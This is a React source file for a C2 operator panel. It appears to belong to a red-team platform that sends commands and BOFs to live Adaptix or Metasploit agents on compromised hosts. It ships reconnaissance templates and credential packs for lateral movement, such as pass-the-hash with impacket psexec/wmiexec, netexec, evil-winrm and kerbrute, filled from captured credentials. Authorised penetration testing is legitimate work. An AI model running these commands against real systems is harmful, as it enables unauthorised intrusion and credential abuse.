import { useEffect, useMemo, useState } from 'react';
import { api } from '../api.js';
import Icon from './Icon.jsx';

const RESERVED_AUTOFILL_KEYS = new Set(['user', 'username', 'pass', 'password', 'secret', 'domain', 'realm', 'target', 'host']);

// C2 integration types that support live execution from this panel.
// Matches backend SUPPORTED_EXEC_C2_TYPES — keep in sync.
const SUPPORTED_EXEC_C2 = ['adaptix', 'metasploit'];

function getOperationTemplates(host) {
  const os = String(host?.os || '').toLowerCase();
  const isWindows = os.includes('win');
  const isLinux = os.includes('linux') || os.includes('ubuntu') || os.includes('debian') || os.includes('centos') || os.includes('redhat');
  const hasDomain = Boolean((host?.domain || '').trim());
  const common = [
    { id: 'whoami', label: 'Whoami', commandline: isWindows ? 'shell whoami /all' : 'shell whoami && id' },
    { id: 'hostname', label: 'Host identity', commandline: isWindows ? 'shell hostname && ver' : 'shell hostname && uname -a' },
    { id: 'net', label: 'Network info', commandline: isWindows ? 'shell ipconfig /all && route print' : 'shell ip a && ip route' },
    { id: 'users', label: 'Logged-on users', commandline: isWindows ? 'shell query user' : 'shell w && who' },
    { id: 'processes', label: 'Processes', commandline: isWindows ? 'shell tasklist' : 'shell ps aux' },
  ];
  const windows = [
    { id: 'admins', label: 'Local admins', commandline: 'shell net localgroup administrators' },
    { id: 'shares', label: 'Shares', commandline: 'shell net share' },
    { id: 'services', label: 'Services', commandline: 'shell sc query type= service state= all' },
    { id: 'sessions', label: 'Net sessions', commandline: 'shell net session' },
  ];
  const domain = [
    { id: 'domain-whoami', label: 'Domain identity', commandline: 'shell whoami /all && echo {{DOMAIN}}' },
    { id: 'dc-discovery', label: 'DC discovery', commandline: 'shell nltest /dsgetdc:{{DOMAIN}}' },
    { id: 'kerb-tickets', label: 'Kerberos tickets', commandline: 'shell klist' },
  ];
  const linux = [
    { id: 'sudoers', label: 'Sudo rights', commandline: 'shell sudo -l' },
    { id: 'mounts', label: 'Mounts', commandline: 'shell mount && cat /etc/fstab' },
    { id: 'services-linux', label: 'Services', commandline: 'shell systemctl list-units --type=service --state=running' },
  ];
  return [
    ...common,
    ...(isWindows ? windows : []),
    ...(isLinux ? linux : []),
    ...(isWindows && hasDomain ? domain : []),
  ];
}

function getCredentialOperationPacks(host, cred) {
  if (!cred) return [];
  const os = String(host?.os || '').toLowerCase();
  const isWindows = os.includes('win');
  const isLinux = os.includes('linux') || os.includes('ubuntu') || os.includes('debian') || os.includes('centos') || os.includes('redhat');
  const hasDomain = Boolean((host?.domain || '').trim() || (cred?.domain || '').trim());
  const type = String(cred.type || '').toLowerCase();
  const isHash = type.includes('hash') || type.includes('ntlm');

  const packs = [];
  if (isWindows) {
    if (isHash) {
      packs.push({ id: 'smb-hash', label: 'SMB hash check', commandline: 'netexec smb {{TARGET}} -u {{USER}} -H {{HASH}}' });
      packs.push({ id: 'wmiexec-hash', label: 'WMI exec (hash)', commandline: 'impacket-wmiexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{HASH}}' });
      packs.push({ id: 'psexec-hash', label: 'PsExec (hash)', commandline: 'impacket-psexec {{DOMAIN}}/{{USER}}@{{TARGET}} -hashes :{{HASH}}' });
    } else {
      packs.push({ id: 'smb-pass', label: 'SMB auth check', commandline: 'netexec smb {{TARGET}} -u {{USER}} -p {{PASS}}' });
      packs.push({ id: 'winrm-pass', label: 'WinRM check', commandline: 'netexec winrm {{TARGET}} -u {{USER}} -p {{PASS}}' });
      packs.push({ id: 'wmiexec-pass', label: 'WMI exec', commandline: 'impacket-wmiexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}' });
      packs.push({ id: 'psexec-pass', label: 'PsExec', commandline: 'impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}' });
      packs.push({ id: 'evil-winrm', label: 'Evil-WinRM', commandline: 'evil-winrm -i {{TARGET}} -u {{USER}} -p {{PASS}}' });
    }
    if (hasDomain) {
      packs.push({ id: 'ldap-bind', label: 'LDAP bind', commandline: 'ldapsearch -x -H ldap://{{TARGET}} -D "{{USER}}@{{DOMAIN}}" -w "{{PASS}}" -b "" "(objectClass=*)"' });
      packs.push({ id: 'kerb-check', label: 'Kerberos check', commandline: 'kerbrute userenum -d {{DOMAIN}} --dc {{TARGET}} users.txt' });
    }
  }
  if (isLinux && !isHash) {
    packs.push({ id: 'ssh-check', label: 'SSH check', commandline: 'ssh -o StrictHostKeyChecking=no {{USER}}@{{TARGET}}' });
    packs.push({ id: 'ssh-batch', label: 'SSH whoami', commandline: 'ssh -o StrictHostKeyChecking=no {{USER}}@{{TARGET}} "whoami && id && hostname"' });
  }
  if (!isWindows && !isLinux) {
    if (isHash) packs.push({ id: 'hash-check', label: 'Hash auth check', commandline: 'netexec smb {{TARGET}} -u {{USER}} -H {{HASH}}' });
    else packs.push({ id: 'auth-check', label: 'Auth check', commandline: 'netexec smb {{TARGET}} -u {{USER}} -p {{PASS}}' });
  }
  return packs;
}

function renderCommandTemplate(template, values) {
  let next = template || '';
  for (const [key, value] of Object.entries(values || {})) {
    if (value == null || value === '') continue;
    const upper = key.toUpperCase();
    next = next.replaceAll(`{{${upper}}}`, String(value));
    next = next.replaceAll(`{{${key}}}`, String(value));
  }
  return next;
}

export default function C2HostActionsPanel({ pid, host, accent = '#5b8af5', onExecuted }) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState(null);
  const [tasks, setTasks] = useState([]);
  const [tasksLoading, setTasksLoading] = useState(false);
  const [cliInput, setCliInput] = useState('shell whoami /all');
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [form, setForm] = useState({ integrationId: '', agentId: '', mode: 'command', commandline: '', credentialId: '', credentialSource: '', commandId: '', params: {} });

  useEffect(() => {
    if (!pid || !host?.id) return;
    let cancelled = false;
    setLoading(true);
    setError('');
    api.getC2HostActions(pid, host.id)
      .then((next) => {
        if (cancelled) return;
        setData(next);
        const firstSession = next.sessions?.find(s => SUPPORTED_EXEC_C2.includes(s.integration_type) && s.alive) || next.sessions?.[0];
        setForm(prev => ({
          ...prev,
          integrationId: firstSession?.integration_id || '',
          agentId: firstSession?.agent_id || firstSession?.beacon_id || '',
        }));
      })
      .catch((e) => { if (!cancelled) setError(e.message || 'Failed to load C2 actions'); })
      .finally(() => { if (!cancelled) setLoading(false); });
    return () => { cancelled = true; };
  }, [host?.id, pid]);

  const sessions = data?.sessions || [];
  const creds = data?.creds || [];
  const sessionOptions = sessions.filter(s => SUPPORTED_EXEC_C2.includes(s.integration_type));
  const operationTemplates = useMemo(() => getOperationTemplates(host), [host]);
  const selectedCredential = useMemo(() => creds.find(c => c.id === form.credentialId && c.source === form.credentialSource) || null, [creds, form.credentialId, form.credentialSource]);
  const credentialPacks = useMemo(() => getCredentialOperationPacks(host, selectedCredential), [host, selectedCredential]);
  const commandCatalog = useMemo(() => (data?.bofs || {})[form.integrationId] || [], [data?.bofs, form.integrationId]);
  const selectedCommand = useMemo(() => commandCatalog.find(item => item.id === form.commandId) || null, [commandCatalog, form.commandId]);
  const visibleParams = useMemo(() => (selectedCommand?.parameters || []).filter(param => !RESERVED_AUTOFILL_KEYS.has(String(param.key || '').toLowerCase())), [selectedCommand]);
  const renderedBofCommand = useMemo(() => selectedCommand ? renderCommandTemplate(selectedCommand.template, form.params) : '', [form.params, selectedCommand]);

  useEffect(() => {
    if (!commandCatalog.length) {
      setForm(prev => ({ ...prev, commandId: '', params: {} }));
      return;
    }
    setForm(prev => {
      const nextId = commandCatalog.some(item => item.id === prev.commandId) ? prev.commandId : commandCatalog[0].id;
      return nextId === prev.commandId ? prev : { ...prev, commandId: nextId, params: {} };
    });
  }, [commandCatalog]);

  useEffect(() => {
    if (!selectedCommand) return;
    const defaults = {};
    for (const param of (selectedCommand.parameters || [])) {
      if (param.default != null && param.default !== '') defaults[param.key] = String(param.default);
    }
    setForm(prev => ({ ...prev, params: Object.keys(prev.params || {}).length ? prev.params : defaults }));
  }, [selectedCommand]);

  const refreshTasks = async ({ silent = false } = {}) => {
    if (!pid || !form.integrationId || !form.agentId) return;
    if (!silent) setTasksLoading(true);
    try {
      const next = await api.getC2AgentTasks(pid, form.integrationId, form.agentId, 25);
      setTasks(next || []);
    } catch (e) {
      if (!silent) setError(e.message || 'Failed to load agent tasks');
    }
    if (!silent) setTasksLoading(false);
  };

  useEffect(() => {
    if (!form.integrationId || !form.agentId) return;
    refreshTasks();
  }, [form.integrationId, form.agentId]);

  useEffect(() => {
    if (!autoRefresh || !form.integrationId || !form.agentId) return undefined;
    const id = setInterval(() => { refreshTasks({ silent: true }); }, 3000);
    return () => clearInterval(id);
  }, [autoRefresh, form.agentId, form.integrationId, pid]);

  const onPickSession = (value) => {
    const [integrationId, agentId] = value.split('::');
    setForm(prev => ({ ...prev, integrationId, agentId }));
  };

  const onParamChange = (key, value) => {
    setForm(prev => ({ ...prev, params: { ...(prev.params || {}), [key]: value } }));
  };

  const applyTemplate = (template) => {
    setForm(prev => ({ ...prev, mode: 'command', commandline: template.commandline }));
    setCliInput(template.commandline);
  };

  const run = async ({ interactive = false } = {}) => {
    const commandline = interactive
      ? cliInput.trim()
      : (form.mode === 'bof' ? renderedBofCommand.trim() : form.commandline.trim());
    if (!form.integrationId || !form.agentId || !commandline) return;
    setRunning(true);
    setResult(null);
    setError('');
    try {
      const res = await api.executeC2HostAction(pid, {
        integration_id: form.integrationId,
        agent_id: form.agentId,
        host_id: host.id,
        mode: interactive ? 'command' : form.mode,
        commandline,
        credential_id: form.credentialId || '',
        credential_source: form.credentialSource || '',
        wait_for_output: !interactive,
        title: interactive ? 'Adaptix CLI command' : (form.mode === 'bof' ? (selectedCommand?.title || 'Adaptix BOF') : 'Adaptix command'),
      });
      setResult(res);
      await refreshTasks({ silent: true });
      onExecuted?.(res);
    } catch (e) {
      setError(e.message || 'Execution failed');
    }
    setRunning(false);
  };

  return (
    <div style={{ background: '#0a0c10', border: '1px solid #1e2029', borderRadius: 6, padding: 10 }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
        <span style={{ fontSize: 9, color: '#404550', textTransform: 'uppercase', letterSpacing: '0.1em', flex: 1 }}>Adaptix live actions</span>
        <button onClick={() => setAutoRefresh(v => !v)} style={{ background: autoRefresh ? `${accent}22` : '#0e1016', border: `1px solid ${autoRefresh ? accent + '66' : '#2a2d35'}`, borderRadius: 3, padding: '1px 6px', cursor: 'pointer', color: autoRefresh ? accent : '#606570', fontSize: 9, fontFamily: 'JetBrains Mono' }}>{autoRefresh ? 'Auto' : 'Manual'}</button>
        <span style={{ fontSize: 9, color: '#cc2233', background: '#cc223318', border: '1px solid #cc223344', borderRadius: 3, padding: '1px 6px', fontFamily: 'JetBrains Mono' }}>Adaptix</span>
      </div>

      {loading && <div style={{ fontSize: 10, color: '#404550' }}>Loading live sessions...</div>}
      {!loading && sessionOptions.length === 0 && <div style={{ fontSize: 10, color: '#404550' }}>No Adaptix agent matched to this host</div>}

      {!loading && sessionOptions.length > 0 && (
        <>
          <select value={form.integrationId && form.agentId ? `${form.integrationId}::${form.agentId}` : ''} onChange={e => onPickSession(e.target.value)} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#c8cdd6', fontSize: 10, fontFamily: 'JetBrains Mono', marginBottom: 8 }}>
            {sessionOptions.map(s => <option key={`${s.integration_id}::${s.agent_id || s.beacon_id}`} value={`${s.integration_id}::${s.agent_id || s.beacon_id}`}>{s.integration_name} :: {s.username || '?'} @ {s.ip || '?'}</option>)}
          </select>

          <div style={{ display: 'flex', gap: 6, marginBottom: 8 }}>
            <button onClick={() => setForm(prev => ({ ...prev, mode: 'command' }))} style={{ flex: 1, background: form.mode === 'command' ? `${accent}22` : '#0e1016', border: `1px solid ${form.mode === 'command' ? accent + '77' : '#2a2d35'}`, borderRadius: 4, padding: '5px 8px', cursor: 'pointer', color: form.mode === 'command' ? accent : '#606570', fontSize: 9, fontFamily: 'JetBrains Mono' }}>Command</button>
            <button onClick={() => setForm(prev => ({ ...prev, mode: 'bof' }))} style={{ flex: 1, background: form.mode === 'bof' ? '#cc223322' : '#0e1016', border: `1px solid ${form.mode === 'bof' ? '#cc223377' : '#2a2d35'}`, borderRadius: 4, padding: '5px 8px', cursor: 'pointer', color: form.mode === 'bof' ? '#cc2233' : '#606570', fontSize: 9, fontFamily: 'JetBrains Mono' }}>BOF</button>
          </div>

          {form.mode === 'command' && operationTemplates.length > 0 && (
            <div style={{ marginBottom: 8 }}>
              <div style={{ fontSize: 8, color: '#404550', marginBottom: 5, textTransform: 'uppercase', letterSpacing: '0.1em' }}>Quick operations</div>
              <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                {operationTemplates.map(template => (
                  <button key={template.id} onClick={() => applyTemplate(template)} style={{ background: form.commandline === template.commandline ? `${accent}22` : '#0e1016', border: `1px solid ${form.commandline === template.commandline ? accent + '66' : '#2a2d35'}`, borderRadius: 999, padding: '3px 8px', cursor: 'pointer', color: form.commandline === template.commandline ? accent : '#808590', fontSize: 9, fontFamily: 'JetBrains Mono' }}>
                    {template.label}
                  </button>
                ))}
              </div>
            </div>
          )}

          {form.mode === 'bof' && commandCatalog.length > 0 && (
            <>
              <select value={form.commandId} onChange={e => setForm(prev => ({ ...prev, commandId: e.target.value, params: {} }))} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#9098a8', fontSize: 10, fontFamily: 'JetBrains Mono', marginBottom: 8 }}>
                {commandCatalog.map(item => <option key={item.id} value={item.id}>{item.group ? `${item.group} :: ` : ''}{item.title || item.name}</option>)}
              </select>
              {selectedCommand?.description && <div style={{ fontSize: 9, color: '#606570', marginBottom: 8, lineHeight: 1.5 }}>{selectedCommand.description}</div>}
              {visibleParams.map(param => (
                <div key={param.key} style={{ marginBottom: 8 }}>
                  <div style={{ fontSize: 8, color: '#404550', marginBottom: 4, textTransform: 'uppercase', letterSpacing: '0.1em' }}>{param.label}</div>
                  {param.type === 'choice' ? (
                    <select value={form.params?.[param.key] || ''} onChange={e => onParamChange(param.key, e.target.value)} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#c8cdd6', fontSize: 10, fontFamily: 'JetBrains Mono' }}>
                      <option value="">Select...</option>
                      {(param.choices || []).map(choice => <option key={choice.value} value={choice.value}>{choice.label}</option>)}
                    </select>
                  ) : param.type === 'boolean' ? (
                    <button onClick={() => onParamChange(param.key, String(!(String(form.params?.[param.key] || '') === 'true')))} style={{ width: '100%', background: String(form.params?.[param.key] || '') === 'true' ? `${accent}22` : '#0e1016', border: `1px solid ${String(form.params?.[param.key] || '') === 'true' ? accent + '77' : '#2a2d35'}`, borderRadius: 4, padding: '6px 8px', color: String(form.params?.[param.key] || '') === 'true' ? accent : '#606570', fontSize: 10, fontFamily: 'JetBrains Mono', cursor: 'pointer', textAlign: 'left' }}>{String(form.params?.[param.key] || '') === 'true' ? 'true' : 'false'}</button>
                  ) : param.type === 'textarea' ? (
                    <textarea value={form.params?.[param.key] || ''} onChange={e => onParamChange(param.key, e.target.value)} rows={3} placeholder={param.placeholder || ''} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#c8cdd6', fontSize: 10, fontFamily: 'JetBrains Mono', resize: 'vertical', boxSizing: 'border-box' }} />
                  ) : (
                    <input value={form.params?.[param.key] || ''} onChange={e => onParamChange(param.key, e.target.value)} placeholder={param.placeholder || ''} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#c8cdd6', fontSize: 10, fontFamily: 'JetBrains Mono', boxSizing: 'border-box' }} />
                  )}
                  {param.description && <div style={{ fontSize: 9, color: '#404550', marginTop: 4 }}>{param.description}</div>}
                </div>
              ))}
              <div style={{ fontSize: 9, color: '#404550', marginBottom: 4, fontFamily: 'JetBrains Mono' }}>Rendered BOF command</div>
              <pre style={{ margin: '0 0 8px', fontSize: 9, color: '#9098a8', fontFamily: 'JetBrains Mono', whiteSpace: 'pre-wrap', wordBreak: 'break-word', background: '#0e1016', border: '1px solid #1e2029', borderRadius: 4, padding: '8px 9px' }}>{renderedBofCommand || selectedCommand?.template || ''}</pre>
            </>
          )}

          <select value={form.credentialId ? `${form.credentialSource}:${form.credentialId}` : ''} onChange={e => {
            const [credentialSource, credentialId] = e.target.value ? e.target.value.split(':') : ['', ''];
            setForm(prev => ({ ...prev, credentialSource, credentialId }));
          }} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#9098a8', fontSize: 10, fontFamily: 'JetBrains Mono', marginBottom: 8 }}>
            <option value="">No credential substitution</option>
            {creds.map(c => <option key={`${c.source}:${c.id}`} value={`${c.source}:${c.id}`}>{c.source} :: {c.username}{c.domain ? `@${c.domain}` : ''}</option>)}
          </select>

          {form.mode === 'command' && selectedCredential && credentialPacks.length > 0 && (
            <div style={{ marginBottom: 8 }}>
              <div style={{ fontSize: 8, color: '#404550', marginBottom: 5, textTransform: 'uppercase', letterSpacing: '0.1em' }}>Credential packs</div>
              <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                {credentialPacks.map(template => (
                  <button key={template.id} onClick={() => applyTemplate(template)} style={{ background: form.commandline === template.commandline ? '#cc223322' : '#0e1016', border: `1px solid ${form.commandline === template.commandline ? '#cc223366' : '#2a2d35'}`, borderRadius: 999, padding: '3px 8px', cursor: 'pointer', color: form.commandline === template.commandline ? '#cc2233' : '#808590', fontSize: 9, fontFamily: 'JetBrains Mono' }}>
                    {template.label}
                  </button>
                ))}
              </div>
            </div>
          )}

          {form.mode === 'command' && <textarea value={form.commandline} onChange={e => setForm(prev => ({ ...prev, commandline: e.target.value }))} placeholder="Command, e.g. shell whoami /all" rows={3} style={{ width: '100%', background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#c8cdd6', fontSize: 10, outline: 'none', fontFamily: 'JetBrains Mono', resize: 'vertical', boxSizing: 'border-box', marginBottom: 8 }} />}

          <div style={{ fontSize: 9, color: '#404550', marginBottom: 8, fontFamily: 'JetBrains Mono' }}>
            Supported autofill placeholders: <code>{'{{USER}}'}</code>, <code>{'{{PASS}}'}</code>, <code>{'{{DOMAIN}}'}</code>, <code>{'{{TARGET}}'}</code>, <code>{'{{HASH}}'}</code>
          </div>

          <button onClick={() => run()} disabled={running || !(form.mode === 'bof' ? renderedBofCommand.trim() : form.commandline.trim())} style={{ background: running ? '#1a1c22' : accent, border: 'none', borderRadius: 4, padding: '6px 10px', cursor: 'pointer', color: '#fff', fontSize: 10, fontWeight: 600, fontFamily: 'JetBrains Mono', display: 'flex', alignItems: 'center', gap: 6, marginBottom: 10 }}>
            <Icon name='terminal' size={11} color='#fff' />{running ? 'Executing...' : form.mode === 'bof' ? 'Run BOF' : 'Run command'}
          </button>

          <div style={{ borderTop: '1px solid #1e2029', paddingTop: 10 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
              <span style={{ fontSize: 9, color: '#404550', textTransform: 'uppercase', letterSpacing: '0.1em', flex: 1 }}>Interactive CLI</span>
              <button onClick={() => refreshTasks()} style={{ background: 'transparent', border: '1px solid #2a2d35', borderRadius: 3, padding: '2px 6px', cursor: 'pointer', color: '#606570', fontSize: 9, fontFamily: 'JetBrains Mono' }}>{tasksLoading ? '...' : 'Refresh'}</button>
            </div>
            <div style={{ display: 'flex', gap: 6, marginBottom: 8 }}>
              <input value={cliInput} onChange={e => setCliInput(e.target.value)} placeholder='shell whoami /all' style={{ flex: 1, background: '#0e1016', border: '1px solid #2a2d35', borderRadius: 4, padding: '6px 8px', color: '#c8cdd6', fontSize: 10, fontFamily: 'JetBrains Mono', minWidth: 0 }} />
              <button onClick={() => run({ interactive: true })} disabled={running || !cliInput.trim()} style={{ background: '#cc2233', border: 'none', borderRadius: 4, padding: '6px 10px', cursor: 'pointer', color: '#fff', fontSize: 10, fontWeight: 600, fontFamily: 'JetBrains Mono' }}>{running ? '...' : 'Send'}</button>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6, maxHeight: 220, overflowY: 'auto' }}>
              {tasks.length === 0 && <div style={{ fontSize: 10, color: '#404550' }}>No task history for this agent yet</div>}
              {tasks.map(task => (
                <div key={task.task_id || `${task.start_time}:${task.cmdline}`} style={{ background: '#0e1016', border: '1px solid #1e2029', borderRadius: 4, padding: '7px 8px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 4 }}>
                    <span style={{ fontSize: 8, color: task.completed ? '#39d353' : '#f09a3a', background: `${task.completed ? '#39d353' : '#f09a3a'}18`, border: `1px solid ${task.completed ? '#39d353' : '#f09a3a'}44`, borderRadius: 3, padding: '1px 5px', fontFamily: 'JetBrains Mono' }}>{task.completed ? 'done' : 'running'}</span>
                    <span style={{ fontSize: 8, color: '#505560', fontFamily: 'JetBrains Mono', marginLeft: 'auto' }}>{task.finish_time || task.start_time || ''}</span>
                  </div>
                  <div style={{ fontSize: 10, color: '#5b8af5', fontFamily: 'JetBrains Mono', marginBottom: (task.text || task.message) ? 4 : 0, whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>{task.cmdline || '(empty command)'}</div>
                  {(task.text || task.message) && <pre style={{ margin: 0, fontSize: 9, color: '#9098a8', fontFamily: 'JetBrains Mono', whiteSpace: 'pre-wrap', wordBreak: 'break-word', maxHeight: 120, overflowY: 'auto' }}>{task.text || task.message}</pre>}
                </div>
              ))}
            </div>
          </div>
        </>
      )}

      {error && <div style={{ fontSize: 10, color: '#cc2233', marginTop: 8, whiteSpace: 'pre-wrap', fontFamily: 'JetBrains Mono' }}>{error}</div>}
      {result?.result && <pre style={{ margin: '8px 0 0', fontSize: 9, color: '#9098a8', fontFamily: 'JetBrains Mono', whiteSpace: 'pre-wrap', wordBreak: 'break-word', background: '#0e1016', border: '1px solid #1e2029', borderRadius: 4, padding: '8px 9px', maxHeight: 160, overflowY: 'auto' }}>{result.result.output || result.result.message || JSON.stringify(result.result.task || result.result, null, 2)}</pre>}
    </div>
  );
}
